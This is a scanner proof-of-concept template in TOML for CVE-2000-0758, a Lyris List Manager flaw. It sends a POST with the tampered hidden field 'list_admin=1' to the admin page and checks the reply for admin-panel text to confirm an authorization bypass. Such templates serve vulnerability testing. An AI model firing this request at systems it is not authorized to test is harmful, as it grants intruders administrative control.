[info]
author = "ave"
description = "通过篡改隐藏表单字段 list_admin 验证是否能绕过权限校验获取管理权限"
id = "POC-AVE-2000-0903"
name = "Lyris List Manager Administration Hole PoC"
severity = "medium"
tags = ["ave-2000-0903"]
vuln_id = [
    "CVE-2000-0758",
    "AVE-2000-0903",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/admin/index.html"
protocol = "http"

[poc.requests.body]
content = "list_admin=1"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Administrator",
    "Admin Control Panel",
]
